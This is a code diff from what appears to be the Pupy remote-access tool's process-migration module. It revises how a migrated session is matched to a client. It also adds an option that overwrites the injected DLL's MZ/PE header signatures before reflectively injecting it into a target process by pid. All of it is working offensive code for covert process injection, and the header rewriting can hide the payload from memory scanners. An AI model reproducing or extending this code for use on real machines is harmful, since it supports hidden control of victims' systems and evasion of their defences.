@@ -1,12 +1,20 @@
+# -*- coding: utf-8 -*-
+
 import pupygen
 import time
 
+
 def has_proc_migrated(client, pid):
     for c in client.pupsrv.clients:
-        if all([True for x in c.desc if x in ["hostname", "platform", "release", "version", "macaddr"] and client.desc[x]==c.desc[x]]):
-            if int(c.desc["pid"])==pid:
+        if int(c.desc['pid']) != pid:
+            continue
+
+        for field in ('hostname', 'macaddr'):
+            if c.desc.get(field) == client.desc.get(field):
                 return c
+
     return None
+
 
 def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False, from_payload=None):
     '''
@@ -62,12 +70,26 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False, fro
 
         module.success("Template: {}".format(filename))
 
+    dllbuff = str(dllbuff)
+
+    if module.config.getboolean('pupyd', 'alt_header'):
+        module.warning('Using ALT markers')
+        # Use ALT markers to simplify debugging
+        for offt in xrange(0, 1024, 4):
+            if dllbuff[offt:offt+4] == 'PE\0\0':
+                dllbuff = ''.join([
+                    'HE',
+                    dllbuff[2:offt],
+                    '\xb5\x00[\xb1',
+                    dllbuff[offt+4:]
+                ])
+
     module.success("injecting DLL in target process %s ..."%pid)
 
     reflective_inject_dll = module.client.remote(
         'pupy', 'reflective_inject_dll', False)
     reflective_inject_dll(
-        int(pid), str(dllbuff), bool(isProcess64bits)
+        int(pid), dllbuff, bool(isProcess64bits)
     )
 
     module.success("DLL injected !")
